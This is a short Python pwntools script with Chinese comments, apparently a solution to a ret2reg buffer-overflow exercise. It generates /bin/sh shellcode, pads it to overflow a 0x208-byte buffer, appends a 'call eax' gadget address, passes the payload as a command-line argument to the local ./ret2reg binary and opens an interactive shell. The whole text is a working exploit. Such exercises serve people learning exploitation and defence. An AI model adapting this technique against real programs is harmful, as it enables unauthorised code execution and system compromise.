from pwn import *

shellcode = asm(shellcraft.sh())

# call eax的地址
call_eax = p32(0x08049019)

# 3.构造payload 
payload = flat([shellcode , b'a'* (0x208+4-len(shellcode)), call_eax])

# 4.启动进程传递参数
io = process(argv=[ "./ret2reg",payload])

# 5.获得交互式shell
io.interactive()